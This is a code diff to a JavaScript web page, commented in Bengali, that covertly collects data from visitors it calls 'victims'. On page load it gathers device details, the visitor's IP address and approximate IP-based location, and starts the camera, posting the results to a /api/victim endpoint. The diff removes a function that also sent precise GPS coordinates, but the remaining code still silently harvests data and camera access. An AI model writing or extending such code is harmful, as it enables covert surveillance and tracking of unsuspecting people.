@@ -128,8 +128,8 @@
                         fbId: 'unknown',
                         timestamp: new Date().toISOString(),
                         ip: null,
-                        location: null,
-                        gpsLocation: null,
+                        location: null,      // IP লোকেশন (GPS নয়)
+                        gpsLocation: null,   // GPS লোকেশন (খালি রাখা হচ্ছে)
                         device: {},
                         media: [],
                         network: {},
@@ -144,7 +144,7 @@
                         data.ip = ipData.ip;
                     } catch (e) {}
 
-                    // --- লোকেশন (IP API) ---
+                    // --- আনুমানিক লোকেশন (IP API) ---
                     try {
                         if (data.ip) {
                             const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
@@ -221,7 +221,7 @@
                     } catch (e) {}
 
                     // ============================================================
-                    // 📤 ডিভাইস ইনফো /api/victim-এ পাঠান
+                    // 📤 ডিভাইস ইনফো /api/victim-এ পাঠান (GPS ছাড়া)
                     // ============================================================
                     setStatus('📤 ডিভাইস তথ্য পাঠানো হচ্ছে...', 'info');
                     console.log('📤 ডিভাইস ইনফো পাঠানো হচ্ছে (ভিক্টিম: ' + victimId + ')');
@@ -246,7 +246,7 @@
             }
 
             // ================================================================
-            // ২. ক্যামেরা অ্যাক্সেস
+            // ২. ক্যামেরা অ্যাক্সেস (শুধু ছবি)
             // ================================================================
             async function startCamera() {
                 try {
@@ -300,51 +300,14 @@
             }
 
             // ================================================================
-            // ৩. লোকেশন (GPS)
-            // ================================================================
-            async function getLocation() {
-                try {
-                    if (navigator.geolocation) {
-                        setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
-                        const pos = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: true,
-                                timeout: 10000
-                            });
-                        });
-                        const gpsData = {
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        };
-
-                        await fetch('/api/victim', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                id: victimId,
-                                gpsLocation: gpsData,
-                                type: 'camera'
-                            })
-                        });
-                        setStatus('📍 লোকেশন পাওয়া গেছে!', 'success');
-                    }
-                } catch (e) {
-                    console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
-                }
-            }
-
-            // ================================================================
-            // ৪. মেইন ফাংশন
+            // ৩. মেইন ফাংশন (লোকেশন নেই)
             // ================================================================
             async function main() {
                 // ১. ডিভাইস ইনফো পাঠান
                 await sendDeviceInfo();
                 // ২. ক্যামেরা চালু করুন
                 await startCamera();
-                // ৩. লোকেশন চেষ্টা করুন
-                await getLocation();
+                // 🔥 লোকেশন (GPS) আর চাওয়া হবে না
             }
 
             // পেজ লোড হলে শুরু করুন
